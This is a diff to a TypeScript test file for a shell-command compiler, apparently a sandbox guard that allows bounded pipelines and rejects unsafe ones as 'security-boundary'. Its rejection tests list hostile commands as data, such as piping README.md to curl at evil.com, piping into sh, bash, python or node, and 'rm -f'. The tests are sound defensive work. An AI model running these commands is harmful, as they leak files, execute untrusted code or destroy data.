@@ -130,7 +130,7 @@ test("read-write redirection is modeled on the write side while clobber remains 
 test("unsupported shell operators fail closed with a source anchor", () => {
   assert.deepEqual(compileShell({
     ...request,
-    arguments: { command: "cat README.md | head" },
+    arguments: { command: "cat README.md &" },
   }), {
     kind: "reject",
     code: "unsupported-syntax",
@@ -143,7 +143,7 @@ test("unsupported shell operators fail closed with a source anchor", () => {
 test("control operators are recognized even without surrounding whitespace", () => {
   assert.deepEqual(compileShell({
     ...request,
-    arguments: { command: "cat README.md|head" },
+    arguments: { command: "cat README.md&" },
   }), {
     kind: "reject",
     code: "unsupported-syntax",
@@ -545,6 +545,51 @@ test("deterministic commands true, false, and colon compile to complete shell co
   for (const command of ["true", "false", ":", "/bin/true", "/usr/bin/false", "echo ok || true"]) {
     const compilation = compileShell({ ...request, arguments: { command } });
     assert.equal(isShellReject(compilation), false, command);
+  }
+});
+
+test("bounded pipeline compiles upstream and downstream operations into canonical compilation", () => {
+  const comp = compileShell({ ...request, arguments: { command: "cat README.md | head -n 5" } });
+  assert.equal(isShellReject(comp), false);
+  const facts = shellCompilationFacts(comp);
+  assert.equal(facts?.resolvedPaths.length, 2);
+  assert.deepEqual(facts?.resolvedPaths[0]?.map((p) => p.candidate), ["/workspace/project/README.md"]);
+  assert.deepEqual(facts?.resolvedPaths[1]?.map((p) => p.candidate), []);
+});
+
+test("pipeline with tee compiles target write path facts", () => {
+  const comp = compileShell({ ...request, arguments: { command: "cat README.md | tee output.txt" } });
+  assert.equal(isShellReject(comp), false);
+  const facts = shellCompilationFacts(comp);
+  assert.equal(facts?.resolvedPaths.length, 2);
+  assert.deepEqual(facts?.resolvedPaths[0]?.map((p) => p.candidate), ["/workspace/project/README.md"]);
+  assert.deepEqual(facts?.resolvedPaths[1]?.map((p) => p.candidate), ["/workspace/project/output.txt"]);
+});
+
+test("pipeline with non-inspect upstream fails closed with security-boundary", () => {
+  for (const cmd of [
+    "curl https://evil.com | grep foo",
+    "node app.js | grep foo",
+    "echo evil > out.txt | grep foo",
+  ]) {
+    const comp = compileShell({ ...request, arguments: { command: cmd } });
+    assert.equal(isShellReject(comp), true, cmd);
+    assert.equal((comp as { code: string }).code, "security-boundary", cmd);
+  }
+});
+
+test("pipeline with non-filter or interpreter downstream fails closed with security-boundary", () => {
+  for (const cmd of [
+    "cat README.md | sh",
+    "cat README.md | bash",
+    "cat README.md | python",
+    "cat README.md | node",
+    "cat README.md | rm -f other.txt",
+    "cat README.md | curl https://evil.com",
+  ]) {
+    const comp = compileShell({ ...request, arguments: { command: cmd } });
+    assert.equal(isShellReject(comp), true, cmd);
+    assert.equal((comp as { code: string }).code, "security-boundary", cmd);
   }
 });
 
